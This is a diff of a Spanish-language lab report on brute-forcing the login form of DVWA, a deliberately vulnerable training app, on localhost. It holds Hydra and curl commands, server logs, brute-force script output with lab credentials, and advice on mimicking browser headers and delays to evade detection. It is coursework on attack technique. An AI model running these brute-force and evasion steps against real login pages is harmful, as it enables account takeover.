@@ -15,6 +15,9 @@
 \usepackage[utf8]{inputenc}
 \usepackage{float}
 \usepackage{hyperref}
+\usepackage{fancyvrb}
+\usepackage{fvextra}
+\RecustomVerbatimEnvironment{verbatim}{Verbatim}{breaklines=true,breakanywhere=true}
 
 \renewcommand{\tablename}{Tabla}
 \usepackage{fancyhdr}
@@ -80,7 +83,7 @@ Utilizando la aplicación web vulnerable DVWA
 \begin{verbatim}
 
 camilo@fedora:/var/www/html/dvwa/config$ sudo podman run --rm -it -p 80:80 vulnerables/web-dvwa
-✔ docker.io/vulnerables/web-dvwa:latest
+[OK] docker.io/vulnerables/web-dvwa:latest
 Trying to pull docker.io/vulnerables/web-dvwa:latest...
 Getting image source signatures
 Copying blob 6cff5f35147f done   | 
@@ -135,7 +138,7 @@ Writing manifest to image destination
     \centering
     \includegraphics[width=1\linewidth]{levanteyredireccione/Captura desde 2025-10-01 23-12-53.png}
     \caption{Ventana que muestra el ajuste de manejo de un 'proxy listener'}
-    \label{fig:placeholder}
+    \label{fig:proxylistener}
 \end{figure}
 \begin{figure}
     \centering
@@ -145,7 +148,6 @@ Writing manifest to image destination
 \end{figure}
 \subsection{Obtención de consulta a replicar (burp)}
 \begin{verbatim}
-    
 
 GET /vulnerabilities/brute/?username=jdsfnjdsbsj&password=jkfdnjfb&Login=Login HTTP/1.1
 Host: localhost:8889
@@ -452,11 +454,21 @@ $ curl "http://localhost:8889/vulnerabilities/brute/?username=njnkyuuykmn&passwo
 \end{enumerate}
 
 \subsection{Instalación y versión a utilizar (hydra)}
-https://hub.docker.com/r/vanhauser/hydra
-docker pull vanhauser/hydra
-sudo usermod -aG docker $USER
-~$ cp usuarios.txt contrasenas.txt /tmp
-camilo@camilo-Aspire-A315-56:~$ cd /tmp
+Para disponer de Hydra se utilizó la imagen oficial \texttt{vanhauser/hydra} disponible en Docker Hub (https://hub.docker.com/r/vanhauser/hydra). Los pasos básicos fueron:
+\begin{verbatim}
+$ docker pull vanhauser/hydra
+$ sudo usermod -aG docker $USER   # habilitar uso de Docker sin sudo
+$ cp usuarios.txt contrasenas.txt /tmp
+$ cd /tmp
+\end{verbatim}
+
+La versión ejecutada dentro del contenedor corresponde a \textbf{Hydra v9.6dev}. Se verificó con el comando:
+\begin{verbatim}
+$ sudo docker run --rm vanhauser/hydra hydra -v
+Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak
+...
+\end{verbatim}
+lo que confirma que todas las pruebas se realizaron sobre la compilación 9.6dev incluida en la imagen oficial.
 
 
 
@@ -465,15 +477,18 @@ camilo@camilo-Aspire-A315-56:~$ cd /tmp
 
 Para realizar el ataque se ejecutó la imagen oficial de Hydra en Docker y se configuraron los parámetros clave del módulo `http-get-form`:
 \begin{itemize}
-        \item \texttt{--network="host"}: expone la red del contenedor para alcanzar el DVWA publicado en el puerto 8889 del host.
-        \item \texttt{-v "$(pwd)":/data}: monta el directorio actual dentro del contenedor para compartir diccionarios y registrar el resultado en \texttt{/data}.
-        \item \texttt{-L} y \texttt{-P}: apuntan a los diccionarios ligeros de usuarios y contraseñas preparados previamente.
-        \item \texttt{-s 8889 localhost http-get-form}: especifica el puerto, host y módulo de Hydra que automatiza envíos GET sobre el formulario objetivo.
-        \item Cadena del formulario \texttt{'/vulnerabilities/brute/:...'}: define los nombres de los campos \texttt{username} y \texttt{password}, la acción \texttt{Login}, inyecta la cookie de sesión con \texttt{H=Cookie: PHPSESSID=...; security=low} y usa \texttt{S=} para detectar éxito cuando aparece ``Welcome to the password protected area''.
-        \item \texttt{-o /data/hydra_light.txt}: guarda el log con las combinaciones válidas encontradas.
+        \item \verb|--network="host"|: expone la red del contenedor para alcanzar el DVWA publicado en el puerto 8889 del host.
+        \item \verb|-v "$(pwd)":/data|: monta el directorio actual dentro del contenedor para compartir diccionarios y registrar el resultado en \verb|/data|.
+        \item \verb|-L| y \verb|-P|: apuntan a los diccionarios ligeros de usuarios y contraseñas preparados previamente.
+        \item \verb|-s 8889 localhost http-get-form|: especifica el puerto, host y módulo de Hydra que automatiza envíos GET sobre el formulario objetivo.
+    \item Cadena del formulario: define los nombres de los campos \verb|username| y \verb|password|, la acción \verb|Login|, inyecta la cookie de sesión y detecta éxito cuando aparece ``Welcome to the password protected area''. La plantilla utilizada fue:
+\begin{verbatim}
+'/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=...; security=low:S=Welcome to the password protected area'
+\end{verbatim}
+        \item \verb|-o /data/hydra_light.txt|: guarda el log con las combinaciones válidas encontradas.
 \end{itemize}
 
-	extbf{Comando ejecutado}
+    \textbf{Comando ejecutado}
 \begin{verbatim}
 $ sudo docker run --rm --network="host" -v "$(pwd)":/data vanhauser/hydra \
     -L /data/usuarios_light.txt -P /data/contrasenas_light.txt -s 8889 \
@@ -482,12 +497,14 @@ $ sudo docker run --rm --network="host" -v "$(pwd)":/data vanhauser/hydra \
     -o /data/hydra_light.txt
 \end{verbatim}
 
-	extbf{Resultado relevante}
+	\textbf{Resultado relevante}
 \begin{verbatim}
 [8889][http-get-form] ... login: admin   password: password
 [8889][http-get-form] ... login: gordonb password: abc123
 1 of 1 target successfully completed, 2 valid passwords found
 \end{verbatim}
+
+\subsection{Obtención de al menos 2 pares (hydra)}
 
 Los pares válidos obtenidos fueron:
 \begin{itemize}
@@ -495,13 +512,21 @@ Los pares válidos obtenidos fueron:
         \item Usuario \texttt{gordonb} con la contraseña \texttt{abc123}.
 \end{itemize}
 
-\subsection{Obtención de al menos 2 pares (hydra)}
 
 \subsection{Explicación paquete curl (tráfico)}
-
+\begin{verbatim}
+    curl "http://localhost:8889/vulnerabilities/brute/?username=njnkyuuykmn&password=jnjrjrnfjer&Login=Login" \
+-b "PHPSESSID=knd082p12k28do4ttsn47hfd35; security=low"
+\end{verbatim}
 \subsection{Explicación paquete burp (tráfico)}
-
+\begin{verbatim}
+    172.17.0.1 - - [03/Oct/2025:02:29:15 +0000] "GET /vulnerabilities/brute/?username=gordonb&password=abc123&Login=Login HTTP/1.1" 200 1827 "http://localhost:8889/vulnerabilities/brute/?username=admin&password=jessica&Login=Login" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0"
+\end{verbatim}
 \subsection{Explicación paquete hydra (tráfico)}
+\begin{Verbatim}[breaklines=true,breakanywhere=true]
+172.17.0.1 - - [03/Oct/2025:02:24:33 +0000] "GET /vulnerabilities/brute/ HTTP/1.0" 200 4651 "-" "Mozilla/5.0 (Hydra)"
+172.17.0.1 - - [03/Oct/2025:02:24:33 +0000] "GET /vulnerabilities/brute/?username=admin&password=abc123&Login=Login HTTP/1.0" 200 4703 "-" "Mozilla/5.0 (Hydra)"
+\end{Verbatim}
 
 \subsection{Mención de las diferencias (tráfico)}
 
@@ -509,74 +534,37 @@ Los pares válidos obtenidos fueron:
 
 \subsection{Interacción con el formulario (python)}
 
+El arquetipo de ataque se implementa en \verb|brute_force_script.py| con la librería \verb|requests|. El flujo es el siguiente:
+\begin{enumerate}
+    \item El usuario del script ingresa la URL base (\verb|http://localhost:8889|), el valor vigente de la cookie \verb|PHPSESSID| y el nivel de seguridad configurado en DVWA. Con esa información se inicializa un objeto \verb|requests.Session()| que mantiene estado entre peticiones.
+    \item El script fija \verb|/vulnerabilities/brute/| como punto final y carga diccionarios ligeros de usuarios y contraseñas. Cada intento reemplaza los campos \verb|username| y \verb|password| del formulario mediante parámetros GET, reproduciendo la estructura que DVWA espera.
+    \item Antes de lanzar la ráfaga de peticiones, se cargan en la sesión las cookies \verb|PHPSESSID| y \verb|security|. DVWA reconoce la sesión como autenticada y permite interactuar con el formulario protegido sin redirigir a \verb|login.php|.
+    \item Por cada combinación, la función \verb|attempt_login| envía una solicitud GET usando la sesión persistente. Tras cada respuesta compara el cuerpo HTML contra la cadena ``Welcome to the password protected area'', el mismo texto que aparece en la versión legítima del sitio. Si se encuentra, el par usuario/clave se marca como válido y se añade al reporte.
+    \item Se introduce un retardo configurable (0.2 s por defecto) para evitar saturar el servidor o activar mitigaciones básicas basadas en tasa. El script imprime progreso en pantalla y al final resume las credenciales extraídas.
+\end{enumerate}
+
+Durante la redacción se verificó el comportamiento consultando el panel \verb|/dvwa/vulnerabilities/brute/| y observando cómo el script replica la misma consulta GET que un navegador, confirmando que los parámetros y el flujo de respuesta coinciden con los de la aplicación DVWA activa.
+
 \subsection{Cabeceras HTTP (python)}
+
+La sesión HTTP se configura para imitar un navegador real y minimizar la detección del tráfico automatizado. Las cabeceras relevantes definidas en el script son:
+\begin{itemize}
+    \item \verb|User-Agent|: se presenta como un navegador Chrome moderno sobre Linux. Esto evita que DVWA identifique el origen como un cliente genérico o vacío, práctica común en bots triviales.
+    \item \verb|Accept| y \verb|Accept-Language|: declaran que el cliente acepta HTML, XML y otros formatos típicos, además de un idioma predominante en inglés. DVWA responde con el mismo contenido que serviría a un usuario legítimo.
+    \item \verb|Accept-Encoding|: anuncia soporte para \verb|gzip| y \verb|deflate|, lo que permite recibir respuestas comprimidas cuando el servidor las ofrece y deja el tráfico indistinguible del generado por un navegador.
+    \item \verb|Connection|: se fija en \verb|keep-alive| para reutilizar la conexión TCP y mejorar el rendimiento del ataque, comportamiento habitual en clientes reales.
+    \item \verb|Upgrade-Insecure-Requests|: valor \verb|1| que comunica la preferencia por HTTPS cuando esté disponible. Aunque DVWA está en HTTP, la cabecera agrega verosimilitud.
+    \item Cookies \verb|PHPSESSID| y \verb|security|: se envían mediante el contenedor de cookies de la sesión. Estas cabeceras son críticas porque sin ellas DVWA no relaciona las peticiones con una sesión autenticada y devolvería el formulario de login.
+\end{itemize}
+
+Al monitorear las peticiones con la herramienta ``Network'' del navegador mientras se ejecuta el script, se observa que los encabezados coinciden con los de una navegación manual, lo que confirma que la automatización reproduce fielmente el tráfico esperado por DVWA.
 
 \subsection{Obtención de al menos 2 pares (python)}
 \begin{verbatim}
-camilo@camilo-Aspire-A315-56:/tmp$ sudo nano brute_force_script.py
-[sudo] contraseña para camilo: 
-camilo@camilo-Aspire-A315-56:/tmp$ sudo python3 brute_force_script.py
+camilo@camilo-Aspire-A315-56:/tmp$ python3 brute_force_script.py
 ================================================================================
 SCRIPT DE FUERZA BRUTA - DVWA
 ================================================================================
-
-================================================================================
-EXPLICACIÓN DE CABECERAS HTTP UTILIZADAS EN EL ATAQUE DE FUERZA BRUTA
-================================================================================
-
-User-Agent:
-  - Propósito: Identifica el navegador/cliente que realiza la petición.
-  - Importancia en este ataque: CRÍTICA. Simula un navegador real para evitar una detección trivial de bots o scripts.
-
-Accept:
-  - Propósito: Le dice al servidor qué tipos de contenido (MIME types) puede entender el cliente.
-  - Importancia en este ataque: Alta. Hace que la petición parezca más legítima, imitando el comportamiento de un navegador estándar.
-
-Connection:
-  - Propósito: Controla si la conexión de red se mantiene abierta después de que finalice la transacción actual.
-  - Importancia en este ataque: Media. Usar 'keep-alive' mejora el rendimiento del ataque al reutilizar la misma conexión TCP para múltiples peticiones.
-
-Cookie:
-  - Propósito: Contiene datos de sesión almacenados. En DVWA, gestiona el ID de sesión (PHPSESSID) y el nivel de seguridad.
-  - Importancia en este ataque: ABSOLUTAMENTE CRÍTICA. Sin una cookie de sesión válida, cada petición sería anónima y el ataque fallaría, ya que el servidor no podría mantener el estado de autenticación.
-
-================================================================================
-4 MÉTODOS COMUNES PARA PREVENIR/MITIGAR ATAQUES DE FUERZA BRUTA
-================================================================================
-
-1. Rate Limiting y Bloqueo de Cuentas:
-  - Limita el número de intentos de login desde una IP en un tiempo determinado y bloquea la cuenta tras varios fallos.
-
-
-2. CAPTCHA:
-  - Presenta un desafío que es fácil para humanos pero difícil para bots, usualmente tras detectar varios intentos fallidos.
-
-
-3. Autenticación de Múltiples Factores (MFA):
-  - Requiere una segunda forma de verificación además de la contraseña (ej. un código del teléfono), haciendo que la contraseña por sí sola sea inútil.
-
-
-4. Monitoreo y Análisis de Comportamiento:
-  - Utiliza sistemas (como un WAF) para detectar patrones de ataque anómalos (ej. intentos desde múltiples IPs, horas inusuales) y bloquearlos proactivamente.
-
-
-================================================================================
-COMPARACIÓN DE RENDIMIENTO DE HERRAMIENTAS
-================================================================================
-
-| Herramienta      | Velocidad | Detección (Sigilo) | Configuración | Flexibilidad |
-|------------------|-----------|--------------------|---------------|--------------|
-| Script Python    | Media     | Muy Alta           | Alta          | Muy Alta     |
-| Hydra            | Muy Alta  | Baja               | Media         | Media        |
-| Burp Suite       | Alta      | Alta               | Baja          | Alta         |
-| cURL (en script) | Baja      | Muy Alta           | Manual        | Baja         |
-    
-
-Análisis Comparativo:
-  - Velocidad: Hydra es el rey de la velocidad gracias a su motor multihilo optimizado en C. Burp Suite también es muy rápido. El script de Python es más lento por defecto debido al intérprete, pero puede mejorarse con librerías asíncronas.
-  - Detección (Sigilo): El script de Python es el más sigiloso. Permite un control total sobre delays, proxies rotativos y la aleatorización de User-Agents, haciendo el ataque casi indistinguible del tráfico humano. cURL es similarmente sigiloso pero a costa de ser manual. Hydra, por su alta velocidad y patrones de petición predecibles, es el más fácil de detectar por un WAF o un IDS.
-  - Flexibilidad: Python gana por goleada. Puede manejar cualquier lógica compleja: CSRF tokens que cambian en cada petición, desafíos JavaScript, o flujos de autenticación de varios pasos. Burp Suite es también muy flexible con sus macros. Hydra está más limitado a escenarios de login estándar.
-    
 
 ================================================================================
 EJECUCIÓN DEL ATAQUE DE FUERZA BRUTA
@@ -592,24 +580,43 @@ EJECUCIÓN DEL ATAQUE DE FUERZA BRUTA
 [INFO] URL objetivo: http://localhost:8889/vulnerabilities/brute/
 [INFO] Delay entre intentos: 0.2s
 ------------------------------------------------------------
-[SUCCESS] ✓ Credenciales válidas encontradas: admin:password                    
-[SUCCESS] ✓ Credenciales válidas encontradas: pablo:letmein                     
-[SUCCESS] ✓ Credenciales válidas encontradas: smithy:password                   
-[0025/0025] Probando smithy:123456...                      
+[SUCCESS] [OK] Credenciales válidas encontradas: admin:password
+[SUCCESS] [OK] Credenciales válidas encontradas: pablo:letmein
+[SUCCESS] [OK] Credenciales válidas encontradas: smithy:password
+[0025/0025] Probando smithy:123456...
 ------------------------------------------------------------
 
 ================================================================================
 RESULTADOS DEL ATAQUE
 ================================================================================
 [SUCCESS] Se encontraron 3 combinaciones válidas:
-  1. Usuario: 'admin' | Contraseña: 'password'
-  2. Usuario: 'pablo' | Contraseña: 'letmein'
-  3. Usuario: 'smithy' | Contraseña: 'password'
+    1. Usuario: 'admin' | Contraseña: 'password'
+    2. Usuario: 'pablo' | Contraseña: 'letmein'
+    3. Usuario: 'smithy' | Contraseña: 'password'
 
 [INFO] Ataque completado.
 \end{verbatim}
 
 \subsection{Comparación de rendimiento con Hydra, Burpsuite, y cURL (python)}
+
+\begin{center}
+\begin{tabular}{|l|l|l|l|l|}
+\hline
+Herramienta & Velocidad & Detección (Sigilo) & Configuración & Flexibilidad \\
+\hline
+Script Python & Media & Muy Alta & Alta & Muy Alta \\
+Hydra & Muy Alta & Baja & Media & Media \\
+Burp Suite & Alta & Alta & Baja & Alta \\
+cURL (en script) & Baja & Muy Alta & Manual & Baja \\
+\hline
+\end{tabular}
+\end{center}
+
+\begin{itemize}
+    \item \textbf{Velocidad:} Hydra destaca gracias a su motor multihilo en C. Burp Suite también es ágil y el script en Python resulta más lento por el intérprete, aunque puede acelerarse con librerías asíncronas.
+    \item \textbf{Detección (Sigilo):} El script en Python es el más sigiloso al permitir control total sobre delays, proxies y User-Agents rotativos. cURL comparte sigilo a costa de ser manual. Hydra, por su ritmo y patrón de peticiones, es el más detectable por un WAF o IDS.
+    \item \textbf{Flexibilidad:} Python puede manejar lógicas complejas (tokens CSRF variables, desafíos JavaScript o autenticaciones de múltiples pasos). Burp Suite ofrece flexibilidad mediante macros. Hydra está optimizado para formularios de login estándar.
+\end{itemize}
 
 \newpage
 \subsection{Demuestra 4 métodos de mitigación (investigación)}
